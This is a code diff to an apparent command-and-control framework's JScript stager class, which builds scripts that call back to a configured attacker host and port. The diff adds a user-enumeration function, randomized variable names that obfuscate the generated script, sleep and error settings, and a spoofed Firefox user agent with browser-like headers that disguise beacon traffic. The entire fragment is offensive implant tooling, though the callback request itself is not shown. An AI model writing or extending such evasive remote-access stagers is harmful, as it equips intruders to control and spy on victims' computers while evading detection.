@@ -1,4 +1,4 @@
-import time
+import urllib.parse as parse
 
 from connect import util
 
@@ -26,11 +26,14 @@ class JScriptStager(Stager):
         super().__init__(ip, port)
 
     def setup_functions(self):
-        self.functions['post_req'] = (util.generate_str())
+        self.functions['whoami'] = util.Function('whoami', 'Enumerates the current user from environment variables.', 'function whoami(){{return {0}}}'.format(self.variables['username'][1]))
 
     def setup_variables(self):
+        self.variables['errors'] = (util.generate_str(), 0)
         self.variables['host'] = (util.generate_str(), self.ip)
         self.variables['port'] = (util.generate_str(), self.port)
+        self.variables['post_req'] = (util.generate_str())
+        self.variables['sleep'] = (util.generate_str(), '3000')
         self.variables['useragent'] = (util.generate_str(), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0')
         self.variables['content-encoding'] = (util.generate_str(), 'gzip, deflate, br')
         self.variables['content-type'] = (util.generate_str(), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
